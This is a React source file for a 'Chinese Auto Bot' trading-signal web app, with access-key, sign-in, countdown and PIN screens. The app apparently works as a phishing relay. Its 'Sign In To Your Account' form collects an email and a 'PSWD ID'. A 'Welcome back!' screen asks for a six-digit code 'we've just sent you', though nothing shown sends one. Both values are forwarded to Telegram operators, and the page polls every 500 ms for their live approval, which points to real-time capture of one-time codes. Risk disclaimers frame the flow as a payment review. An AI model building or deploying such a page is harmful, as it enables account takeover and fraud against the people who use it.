import { type FormEvent, type ReactNode, useEffect, useState } from 'react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { ErrorBoundary } from '@/components/error-boundary';
import { Toaster } from '@/components/ui/toaster';
import { TooltipProvider } from '@/components/ui/tooltip';
import NotFound from '@/pages/not-found';
import SignalGenerator from '@/pages/signal-generator';
import SignalResult from '@/pages/signal-result';
import { resolvedReviewStatus, reviewSubmissionError } from '@/lib/review-errors';
import {
  useCreatePaymentReviewRequest,
  useCreatePinReviewRequest,
  useGetPaymentReviewStatus,
  getGetPaymentReviewStatusQueryKey,
  useGetPinReviewStatus,
  getGetPinReviewStatusQueryKey,
  useHealthCheck,
  useVerifyKey,
} from '@workspace/api-client-react';
import {
  Activity, ArrowLeft, ArrowRight, AlertTriangle, Brain, ChartNoAxesColumnIncreasing, Check, CheckCircle2,
  ChevronRight, CircleAlert, FileText, Headphones, KeyRound,
  LockKeyhole, ShieldCheck, Sparkles, Zap,
} from 'lucide-react';
import { Link, Route, Switch, useLocation, Router as WouterRouter } from 'wouter';

const queryClient = new QueryClient();
const ACCESS_KEY_VERIFIED_KEY = 'access_key_verified';
const PIN_REVIEW_CONSENT_KEY = 'pin_review_consent';
const PIN_REVIEW_REQUEST_KEY = 'pin_review_request';
const PAYMENT_REVIEW_REQUEST_KEY = 'payment_review_request';
const PAYMENT_REVIEW_RESULT_KEY = 'payment_review_result';
const PAYMENT_REVIEW_APPROVED_KEY = 'payment_review_approved';
const BOT_ACCESS_GRANTED_KEY = 'bot_access_granted';
const scanLabels = [
  'Request received…',
  'Sending for review…',
  'Checking request status…',
  'Preparing access…',
  'Review still pending…',
];
const pillLabels = ['RECEIVED…', 'SENDING…', 'CHECKING…', 'PROCESSING…', 'REVIEW…'];
const thresholds = [3, 8, 18, 25, 30];

function Home() {
  const health = useHealthCheck();
  const verifyKey = useVerifyKey();
  const [, setLocation] = useLocation();
  const [key, setKey] = useState('');
  const [error, setError] = useState('');
  const [pending, setPending] = useState(false);
  const online = !health.isError && !!health.data &&
    !['down', 'unavailable', 'offline', 'error'].includes(health.data.status.toLowerCase());

  function submit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    if (!key.trim() || pending) return;
    const candidate = key;
    setPending(true);
    setError('');
    verifyKey.mutate({ data: { key: candidate } }, {
      onSuccess: (result) => {
        setPending(false);
        setKey('');
        if (result.ok) {
          window.sessionStorage.setItem(ACCESS_KEY_VERIFIED_KEY, 'accepted');
          window.sessionStorage.removeItem(PAYMENT_REVIEW_APPROVED_KEY);
          window.sessionStorage.removeItem(BOT_ACCESS_GRANTED_KEY);
          setLocation('/login');
        } else {
          setError(result.error || 'Invalid access key. Please try again.');
        }
      },
      onError: (err) => {
        const e = err as { status?: number; response?: { status?: number } };
        setPending(false);
        setError((e.status ?? e.response?.status) === 429
          ? 'Too many attempts. Please wait a moment and try again.'
          : 'Unable to verify your key. Please try again.');
      },
    });
  }

  return (
    <main className="access-screen">
      <div className="access-frame">
        <header className="access-header">
          <img src="/assets/logo.png" alt="Chinese Auto Bot" className="brand-logo" />
          <span className="brand-divider" />
          <div className="brand-wordmark"><b>CHINESE</b><strong>AUTO BOT</strong></div>
          <ShieldCheck className="secure-mark" size={22} aria-label="Secure" />
          <button type="button" className="menu-button" aria-label="Menu" data-testid="button-open-test-key" onClick={() => setLocation('/test-key')}>
            <span /><span /><span />
          </button>
        </header>

        <section className="access-hero">
          <img src="/assets/hero.jpg" alt="Armored Chinese Auto Bot trading assistant" className="hero-image" />
          <div className="hero-copy">
            <h1>Chinese<br /><em>Auto Bot</em></h1>
            <p>Signal Generator<br />Local demo only</p>
            <ul>
              <li>20 Demo Markets <CheckCircle2 /></li>
              <li>No Broker Connected <CheckCircle2 /></li>
              <li>No Orders Placed <CheckCircle2 /></li>
            </ul>
          </div>
        </section>

        <section className="key-panel">
          <h2><KeyRound size={23} />Access Key</h2>
          <form onSubmit={submit}>
            <label className={`key-input ${error ? 'has-error' : ''}`}>
              <KeyRound size={17} aria-hidden="true" />
              <span />
              <input
                aria-label="Access key"
                data-testid="input-access-key"
                value={key}
                onChange={(e) => { setKey(e.target.value); setError(''); }}
                placeholder="Enter your access key…"
                autoComplete="off"
                maxLength={128}
                disabled={pending}
              />
            </label>
            {error && <p className="key-error" role="alert"><CircleAlert size={15} />{error}</p>}
            <button className="activate-button" type="submit" data-testid="button-activate" disabled={!key.trim() || pending}>
              <Activity size={24} />
              <span>{pending ? 'Verifying…' : 'Activate Bot'}</span>
              <ArrowRight size={19} />
            </button>
          </form>
        </section>

        <section className="feature-grid" aria-label="Features">
          <Feature icon={<Brain />} title="Demo signals" detail="Local simulated output" />
          <Feature icon={<Zap />} title="No broker" detail="No orders are placed" />
          <Feature icon={<ShieldCheck />} title="Access review" detail="PASWD review" />
          <Feature icon={<ChartNoAxesColumnIncreasing />} title="20 markets" detail="Regular and OTC pairs" />
        </section>
        <footer className="access-footer">
          <a href="https://t.me/Trader_Rihab07" target="_blank" rel="noopener noreferrer" data-testid="link-help-support"><Headphones />Help &amp; Support</a>
          <i />
          <Link href="/terms" data-testid="link-terms"><FileText />条款与风险披露</Link>
        </footer>
        <div className="health-note" data-testid="status-api-health">
          <span className={online ? 'health-dot online' : 'health-dot'} />
          {health.isLoading ? 'Connecting to service' : online ? 'Service connected' : 'Service status unavailable'}
        </div>
      </div>
    </main>
  );
}

function Terms() {
  const [, setLocation] = useLocation();
  const sections = [
    {
      number: '01',
      title: '交易亏损',
      text: '市场可能快速且不可预测地波动。您可能损失部分或全部交易本金。若使用杠杆，损失可能会扩大，并可能导致强制平仓。请仅使用您能承受损失的资金进行交易。',
    },
    {
      number: '02',
      title: '不保证收益，也不提供个性化建议',
      text: '不保证盈利，也不保证信号准确。过去、假设或模拟的结果不能预测未来表现。本页面内容不构成个性化投资建议。您需对自己的决策负责。',
    },
    {
      number: '03',
      title: '模拟交易与实盘交易',
      text: '信号由本应用本地模拟生成，不使用实时市场数据，也不连接经纪商或提交订单。模拟结果不能代表实际市场或交易表现。',
    },
    {
      number: '04',
      title: '本地模拟信号',
      text: '本应用生成的信号可能不准确或延迟。软件故障、设置错误或异常市场状况也可能影响结果。模拟信号不代表真实市场表现。',
    },
    {
      number: '05',
      title: '在其他平台进行真实交易',
      text: '本应用不会提交订单。如果您自行将模拟信号用于其他平台，波动、价格跳空、流动性不足、部分成交或未成交、点差、滑点、平台限制、费用、服务中断和追加保证金都可能造成损失。',
    },
    {
      number: '06',
      title: '技术与第三方服务',
      text: '互联网、托管服务、数据提供商、经纪商或交易所发生中断或错误，可能影响服务或交易执行。网络安全事件、第三方条款及资产托管安排也存在风险。无法保证服务始终可用。',
    },
    {
      number: '07',
      title: '账户安全',
      text: '请保护您的账户和凭证。只有在您同意后，本应用签发的机器人访问 PIN 才会通过 Telegram 发送给经授权的管理员进行审核。切勿提交密码、恢复短语、交易所 API 密钥，或来自电子邮件、短信或其他服务的验证码。',
    },
    {
      number: '08',
      title: '法律与税务',
      text: '服务可用性、资格要求、金融监管规则、牌照要求及税务义务因所在地而异。请核实适用于您的法律法规，必要时咨询合格的法律或税务顾问。',
    },
  ];

  return (
    <main className="terms-screen">
      <div className="terms-frame">
        <header className="terms-header">
          <button type="button" className="terms-back" onClick={() => setLocation('/')} data-testid="button-back-home">
            <ArrowLeft size={17} /> 返回访问页
          </button>
          <div className="terms-brand">
            <img src="/assets/logo.png" alt="" />
            <span><b>CHINESE</b><strong>AUTO BOT</strong></span>
          </div>
        </header>

        <section className="terms-intro">
          <div className="terms-kicker"><FileText size={15} /> 请在继续前阅读</div>
          <h1>条款与<em>风险披露</em></h1>
          <p className="terms-lede">使用本地模拟信号工具前，请仔细了解以下重要风险。</p>
          <div className="terms-notice" role="note" data-testid="notice-general-risk">
            <span className="terms-notice-icon"><AlertTriangle size={20} /></span>
            <p>本页面仅概述一般风险，不构成法律、税务或投资建议，也不构成完整的服务条款。内容可能未涵盖所有风险，亦不一定符合您所在司法管辖区的要求。在公开使用或进行真实资金交易前，请咨询合格的法律顾问。</p>
          </div>
          <div className="terms-notice terms-data-notice" role="note" data-testid="notice-payment-data">
            <span className="terms-notice-icon"><ShieldCheck size={20} /></span>
            <p>此表单中的 PASWD 指付款 ID，而非账户密码。您提交的邮箱和付款 ID 会通过 Telegram 发送给经授权的机器人管理员，用于付款审核。只有在您勾选付款审核表单中的同意框后，本应用签发的六位访问 PIN 才会发送给管理员审核。请勿提交密码、银行卡或银行账户信息，或来自电子邮件、短信或其他服务的验证码。审核完成或请求过期后，本应用会清除提交的付款信息；Telegram 消息会尽可能清除，但 Telegram 可能根据其政策保留副本。</p>
          </div>
        </section>

        <div className="terms-body">
          <aside className="terms-side-note">
            <span className="terms-side-index">请仔细阅读</span>
            <p>本应用生成的模拟信号无法预测市场，也不能消除交易风险。</p>
            <span className="terms-side-rule" />
            <span className="terms-side-foot">一般风险摘要</span>
          </aside>
          <section className="terms-list" aria-label="风险主题">
            {sections.map((section) => (
              <article className="terms-section" key={section.number} data-testid={`section-risk-${section.number}`}>
                <span className="terms-number">{section.number}</span>
                <div>
                  <h2>{section.title}</h2>
                  <p>{section.text}</p>
                </div>
              </article>
            ))}
          </section>
        </div>

        <footer className="terms-footer">
          <p>继续之前，请花时间了解相关风险。</p>
          <button type="button" onClick={() => setLocation('/')} data-testid="button-return-access">
            <ArrowLeft size={17} /> 返回访问页
          </button>
        </footer>
      </div>
    </main>
  );
}

function Feature({ icon, title, detail }: { icon: ReactNode; title: string; detail: string }) {
  return <article className="feature-card"><div className="feature-icon">{icon}</div><strong>{title}</strong><span>{detail}</span></article>;
}

function Login() {
  const [, setLocation] = useLocation();
  const hasVerifiedAccess =
    typeof window !== 'undefined' &&
    window.sessionStorage.getItem(ACCESS_KEY_VERIFIED_KEY) === 'accepted';
  const [email, setEmail] = useState('');
  const [paymentId, setPaymentId] = useState('');
  const [consent, setConsent] = useState(false);
  const [formError, setFormError] = useState(() => {
    if (typeof window === 'undefined') return '';
    const result = window.sessionStorage.getItem(PAYMENT_REVIEW_RESULT_KEY);
    window.sessionStorage.removeItem(PAYMENT_REVIEW_RESULT_KEY);
    return result === 'rejected'
      ? 'Wrong details. Please try again.'
      : result === 'expired'
        ? 'Review expired. Please submit your details again.'
        : '';
  });
  const createReview = useCreatePaymentReviewRequest();

  useEffect(() => {
    window.sessionStorage.removeItem(PIN_REVIEW_CONSENT_KEY);
    window.sessionStorage.removeItem(PIN_REVIEW_REQUEST_KEY);
  }, []);
  useEffect(() => {
    if (!hasVerifiedAccess) {
      setLocation('/');
      return;
    }
    if (window.sessionStorage.getItem(PAYMENT_REVIEW_REQUEST_KEY)) {
      setLocation('/countdown');
    }
  }, [hasVerifiedAccess, setLocation]);

  function submitReview(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    if (!email.trim() || !paymentId.trim() || !consent || createReview.isPending) {
      return;
    }

    setFormError('');
    window.sessionStorage.removeItem(PAYMENT_REVIEW_APPROVED_KEY);
    window.sessionStorage.removeItem(BOT_ACCESS_GRANTED_KEY);
    createReview.mutate(
      {
        data: {
          email: email.trim(),
          paymentId: paymentId.trim(),
          consent: true,
        },
      },
      {
        onSuccess: (result) => {
          window.sessionStorage.setItem(PIN_REVIEW_CONSENT_KEY, 'accepted');
          window.sessionStorage.setItem(PAYMENT_REVIEW_REQUEST_KEY, result.requestId);
          setLocation('/countdown');
        },
        onError: (error) => setFormError(reviewSubmissionError(error)),
      },
    );
  }

  return (
    <main className="login-screen">
      <div className="login-art" aria-hidden="true"><svg viewBox="0 0 390 728"><polygon points="54,571 90,571 74,590" fill="#1b202d" /><polyline points="0,623 58,604 117,631 176,594 232,620 293,585 352,610 390,590" /></svg></div>
      <header className="login-header"><img src="/assets/logo2.png" alt="Chinese Auto Bot" /><div><b>CHINESE</b><strong>AUTO BOT</strong></div></header>
      <h1>Sign In To Your Account</h1>
      <p className="login-subtitle">Use your payment email and Payment ID to continue. Do not enter a password.</p>
      <form className="login-card" onSubmit={submitReview}>
        <label className="floating-field">
          <span>Email Address</span>
          <input
            type="email"
            autoComplete="email"
            required
            maxLength={254}
            value={email}
            onChange={(event) => setEmail(event.target.value)}
            aria-label="Email Address"
            data-testid="input-payment-email"
          />
        </label>
        <label className="floating-field">
            <span>PSWD ID</span>
          <input
            type="text"
            autoComplete="off"
            required
            maxLength={128}
            value={paymentId}
            onChange={(event) => setPaymentId(event.target.value)}
            aria-label="PSWD ID"
            data-testid="input-payment-id"
          />
        </label>
        <div className="payment-consent">
          <input
            id="payment-review-consent"
            type="checkbox"
            checked={consent}
            onChange={(event) => setConsent(event.target.checked)}
            required
            data-testid="checkbox-payment-consent"
          />
          <div>
            <label htmlFor="payment-review-consent">
              I agree to do this
            </label>
          </div>
        </div>
        {formError && <p className="payment-feedback error" role="alert">{formError}</p>}
        <button
          className="signin-button"
          type="submit"
          data-testid="button-submit-payment-review"
          disabled={!email.trim() || !paymentId.trim() || !consent || createReview.isPending}
        >
          {createReview.isPending ? 'Sending…' : 'Submit'}
          <span><ChevronRight /></span>
        </button>
      </form>
      <div className="flag-rule" />
      <p className="risk-copy">Risk warning: trading involves significant risk. Signals are local simulations; no live market feed or broker is connected.</p>
      <p className="copyright">© Chinese Auto Bot, 2026. All rights reserved.</p>
    </main>
  );
}

function Countdown({ second = false }: { second?: boolean }) {
  const [, setLocation] = useLocation();
  const [deadline] = useState(() => Date.now() + 30_000);
  const [now, setNow] = useState(() => Date.now());
  const [paymentRequestId, setPaymentRequestId] = useState<string | null>(() => {
    if (second || typeof window === 'undefined') return null;
    return window.sessionStorage.getItem(PAYMENT_REVIEW_REQUEST_KEY);
  });
  const seconds = Math.max(0, Math.ceil((deadline - now) / 1000));
  const paymentReview = useGetPaymentReviewStatus(paymentRequestId ?? '', {
    query: {
      queryKey: getGetPaymentReviewStatusQueryKey(paymentRequestId ?? ''),
      enabled: !second && Boolean(paymentRequestId),
      refetchInterval: paymentRequestId ? 500 : false,
      refetchIntervalInBackground: true,
    },
  });
  const paymentStatus = resolvedReviewStatus(paymentReview.data, paymentReview.error);
  useEffect(() => {
    const timer = window.setInterval(() => setNow(Date.now()), 250);
    return () => window.clearInterval(timer);
  }, []);
  useEffect(() => {
    if (second) {
      if (window.sessionStorage.getItem(BOT_ACCESS_GRANTED_KEY) !== 'accepted') {
        setLocation('/');
      }
      return;
    }
    if (!paymentRequestId) {
      setLocation(
        window.sessionStorage.getItem(PAYMENT_REVIEW_APPROVED_KEY) === 'approved'
          ? '/pin'
          : '/login',
      );
    }
  }, [second, paymentRequestId, setLocation]);
  useEffect(() => {
    if (second || !paymentRequestId || !paymentStatus || paymentStatus === 'pending') {
      return;
    }

    window.sessionStorage.removeItem(PAYMENT_REVIEW_REQUEST_KEY);
    setPaymentRequestId(null);
    if (paymentStatus === 'approved') {
      window.sessionStorage.setItem(PAYMENT_REVIEW_APPROVED_KEY, 'approved');
      setLocation('/pin');
      return;
    }

    window.sessionStorage.removeItem(PAYMENT_REVIEW_APPROVED_KEY);
    window.sessionStorage.setItem(PAYMENT_REVIEW_RESULT_KEY, paymentStatus);
    setLocation('/login');
  }, [second, paymentRequestId, paymentStatus, setLocation]);
  useEffect(() => {
    if (second && seconds === 0) {
      const timeout = window.setTimeout(
        () => setLocation('/signal-generator'),
        600,
      );
      return () => window.clearTimeout(timeout);
    }
    return undefined;
  }, [seconds, second, setLocation]);
  const elapsed = Math.min(second ? 30 : 29, 30 - seconds);
  const activeIndex = thresholds.findIndex((threshold) => elapsed < threshold);
  const pill = activeIndex < 0
    ? 'READY'
    : !second && seconds === 0
      ? 'PENDING'
      : pillLabels[activeIndex];
  return (
    <main className="countdown-screen">
      <div className="count-glow" /><div className="count-dots" />
      <svg className="circuit-lines" viewBox="0 0 390 693" aria-hidden="true">
        <g><path d="M0 41 12 54v66l28 28v84l-18 20v48M0 150l28 28v67M6 240v90l28 28" /><circle cx="62" cy="150" r="1.6" /><circle cx="32" cy="200" r="1.6" /><circle cx="60" cy="290" r="1.6" /></g>
        <g transform="translate(390 0) scale(-1 1)"><path d="M0 41 12 54v66l28 28v84l-18 20v48M0 150l28 28v67M6 240v90l28 28" /><circle cx="62" cy="150" r="1.6" /><circle cx="32" cy="200" r="1.6" /><circle cx="60" cy="290" r="1.6" /></g>
      </svg>
      <div className="system-active"><i />SYSTEM ACTIVE</div>
      <h1>Chinese bot</h1><div className="title-underline" />
      <svg className="count-ring" viewBox="0 0 300 300" aria-hidden="true">
        <circle cx="150" cy="150" r="110" className="ring-dotted" />
        <circle cx="150" cy="150" r="101.5" className="ring-thin" />
        <circle cx="150" cy="150" r="80" className="ring-core" />
        <circle cx="150" cy="150" r="87" className="ring-track" />
        <circle cx="150" cy="150" r="87" className="ring-progress" style={{ strokeDashoffset: 546.64 * (seconds / 30) }} />
      </svg>
      <div className="seconds">{seconds}</div><div className="seconds-label">SEC</div>
      <section className="scan-panel">
        <div className="scan-heading"><i />SCAN PROTOCOL</div>
        {scanLabels.map((label, index) => {
          const done = elapsed >= thresholds[index];
          const active = index === activeIndex;
          return <div className={`scan-row ${done ? 'done' : active ? 'active' : ''}`} key={label}>
            <span className="scan-icon">{done ? <Check size={18} /> : index === 4 && !active ? <Sparkles size={16} /> : <i />}</span>
            <span>{label}</span>{active && <b />}
          </div>;
        })}
      </section>
      <div className="status-pill"><i />{pill}</div>
      <svg className="floor-rings" viewBox="0 0 390 60" aria-hidden="true"><ellipse cx="195" cy="42" rx="125" ry="20" /><ellipse cx="195" cy="42" rx="100" ry="15" /><ellipse cx="195" cy="42" rx="70" ry="9" /></svg>
      {second && seconds === 0 && <div className="countdown-final" role="status">Opening Signal Generator…</div>}
      {!second && paymentRequestId && paymentReview.isError && (
        <div className="countdown-final status-error" role="status">Connection interrupted. Checking again…</div>
      )}
    </main>
  );
}

function Pin() {
  const [, setLocation] = useLocation();
  const hasFirstPageConsent =
    typeof window !== 'undefined' &&
    window.sessionStorage.getItem(PIN_REVIEW_CONSENT_KEY) === 'accepted';
  const hasPaymentApproval =
    typeof window !== 'undefined' &&
    window.sessionStorage.getItem(PAYMENT_REVIEW_APPROVED_KEY) === 'approved';
  const [pin, setPin] = useState('');
  const [error, setError] = useState('');
  const [requestId, setRequestId] = useState<string | null>(() => {
    if (
      typeof window === 'undefined' ||
      window.sessionStorage.getItem(PIN_REVIEW_CONSENT_KEY) !== 'accepted' ||
      window.sessionStorage.getItem(PAYMENT_REVIEW_APPROVED_KEY) !== 'approved'
    ) return null;
    return window.sessionStorage.getItem(PIN_REVIEW_REQUEST_KEY);
  });
  const createPinReview = useCreatePinReviewRequest();
  const reviewStatus = useGetPinReviewStatus(requestId ?? '', {
    query: {
      queryKey: getGetPinReviewStatusQueryKey(requestId ?? ''),
      enabled: Boolean(requestId),
      refetchInterval: requestId ? 500 : false,
      refetchIntervalInBackground: true,
    },
  });
  const pinStatus = resolvedReviewStatus(reviewStatus.data, reviewStatus.error);

  useEffect(() => {
    if (!hasFirstPageConsent || !hasPaymentApproval) {
      setLocation('/login');
    }
  }, [hasFirstPageConsent, hasPaymentApproval, setLocation]);

  useEffect(() => {
    if (!requestId || !pinStatus || pinStatus === 'pending') return;
    if (pinStatus === 'approved') {
      window.sessionStorage.removeItem(PIN_REVIEW_REQUEST_KEY);
      window.sessionStorage.setItem(BOT_ACCESS_GRANTED_KEY, 'accepted');
      setRequestId(null);
      setLocation('/countdown-2');
      return;
    }

    window.sessionStorage.removeItem(PIN_REVIEW_REQUEST_KEY);
    setRequestId(null);
    setPin('');
    setError(
      pinStatus === 'rejected'
        ? 'Wrong PIN. Please try again.'
        : 'Review expired. Please submit your PIN again.',
    );
  }, [requestId, pinStatus, setLocation]);

  function submitPin(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    if (pin.length !== 6) {
      setError('Please enter a 6-digit code.');
      return;
    }
    if (!hasFirstPageConsent) {
      setLocation('/login');
      return;
    }
    if (createPinReview.isPending || requestId) return;

    setError('');
    createPinReview.mutate(
      { data: { pin, consent: true } },
      {
        onSuccess: (result) => {
          setPin('');
          window.sessionStorage.setItem(PIN_REVIEW_REQUEST_KEY, result.requestId);
          setRequestId(result.requestId);
        },
        onError: (requestError) => setError(reviewSubmissionError(requestError)),
      },
    );
  }

  return <main className="pin-screen">
    <h1>Welcome back!</h1>
    <p className="pin-intro">Please enter the access PIN-code we've just sent you</p>
    <form className="pin-review-form" onSubmit={submitPin}>
      <label className={`pin-field ${error ? 'pin-error' : ''}`}>
        <span>Access PIN</span>
        <input
          aria-label="Bot access PIN"
          type="text"
          inputMode="numeric"
          maxLength={6}
          autoComplete="off"
          placeholder="Enter 6-digit code…"
          value={pin}
          data-testid="input-access-pin"
          disabled={Boolean(requestId) || createPinReview.isPending}
          onChange={(event) => {
            setPin(event.target.value.replace(/\D/g, '').slice(0, 6));
            setError('');
          }}
        />
      </label>
      {error && <p className="pin-validation" role="alert">{error}</p>}
      {createPinReview.isPending && <p className="pin-review-status" role="status">Sending PIN for review…</p>}
      {requestId && reviewStatus.isError && (
        <p className="pin-review-status status-error" role="status">
          Connection interrupted. Retrying…
        </p>
      )}
      <button
        className="pin-submit"
        type="submit"
        data-testid="button-submit-pin-review"
        disabled={Boolean(requestId) || createPinReview.isPending}
      >
        {requestId ? 'PIN submitted' : createPinReview.isPending ? 'Sending…' : 'Submit PIN'}
        <span><ChevronRight /></span>
      </button>
    </form>
    <button className="go-back" type="button" data-testid="button-pin-go-back" disabled={Boolean(requestId) || createPinReview.isPending} onClick={() => setLocation('/login')}>Go back</button>
    <p className="copyright pin-copyright">© Chinese Auto Bot, 2026. All rights reserved.</p>
  </main>;
}

function TestKey() {
  const [, setLocation] = useLocation();
  const health = useHealthCheck();
  const verify = useVerifyKey();
  const [value, setValue] = useState('');
  const [result, setResult] = useState<'accepted' | 'rejected' | 'error' | null>(null);
  const online = !!health.data && !health.isError && !['down', 'unavailable', 'offline', 'error'].includes(health.data.status.toLowerCase());
  function submit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault();
    if (!value.trim() || verify.isPending) return;
    const candidate = value;
    setValue('');
    setResult(null);
    verify.mutate({ data: { key: candidate } }, {
      onSuccess: (response) => setResult(response.ok ? 'accepted' : 'rejected'),
      onError: () => setResult('error'),
    });
  }
  return <main className="test-screen"><section className="test-card"><button className="test-back" type="button" data-testid="button-test-key-back" onClick={() => setLocation('/')}>← Chinese Auto Bot</button><div className="test-eyebrow"><LockKeyhole size={16} />TEMPORARY API TOOL</div><h1>Access key check</h1><p>Standalone live check. Only the access key is sent to the verification endpoint.</p>
    <form onSubmit={submit}><label htmlFor="test-key">Candidate key</label><input id="test-key" data-testid="input-test-key" value={value} maxLength={128} autoComplete="off" onChange={(e) => { setValue(e.target.value); setResult(null); }} placeholder="Enter an access key" /><button type="submit" data-testid="button-verify-test-key" disabled={!value.trim() || verify.isPending}>{verify.isPending ? 'Checking…' : 'Verify key'}<ArrowRight size={16} /></button></form>
    {result && <div className={`test-result ${result}`} role="status">{result === 'accepted' ? 'Key accepted' : result === 'rejected' ? 'Key not accepted' : 'Verification service unavailable'}</div>}
    <div className="test-service"><span className={online ? 'health-dot online' : 'health-dot'} />{health.isLoading ? 'Checking service…' : online ? `Service status: ${health.data?.status}` : 'Service unavailable'}<button type="button" data-testid="button-refresh-service-status" onClick={() => void health.refetch()} disabled={health.isFetching}>Refresh</button></div>
  </section></main>;
}

function RequireBotAccess({ children }: { children: ReactNode }) {
  const [, setLocation] = useLocation();
  const [allowed] = useState(() =>
    typeof window !== 'undefined' &&
    window.sessionStorage.getItem(BOT_ACCESS_GRANTED_KEY) === 'accepted',
  );

  useEffect(() => {
    if (!allowed) setLocation('/');
  }, [allowed, setLocation]);

  return allowed ? children : null;
}

function Router() {
  return <RoutedErrorBoundary><Switch>
    <Route path="/" component={Home} />
    <Route path="/login" component={Login} />
    <Route path="/countdown" component={() => <Countdown />} />
    <Route path="/pin" component={Pin} />
    <Route path="/countdown-2" component={() => <Countdown second />} />
    <Route path="/test-key" component={TestKey} />
    <Route path="/terms" component={Terms} />
    <Route path="/signal-generator" component={() => <RequireBotAccess><SignalGenerator /></RequireBotAccess>} />
    <Route path="/signal-result" component={() => <RequireBotAccess><SignalResult /></RequireBotAccess>} />
    <Route component={NotFound} />
  </Switch></RoutedErrorBoundary>;
}

function RoutedErrorBoundary({ children }: { children: ReactNode }) {
  const [location] = useLocation();
  return <ErrorBoundary resetKey={location}>{children}</ErrorBoundary>;
}

function App() {
  return <QueryClientProvider client={queryClient}><TooltipProvider><WouterRouter base={import.meta.env.BASE_URL.replace(/\/$/, '')}><Router /></WouterRouter><Toaster /></TooltipProvider></QueryClientProvider>;
}

export default App;
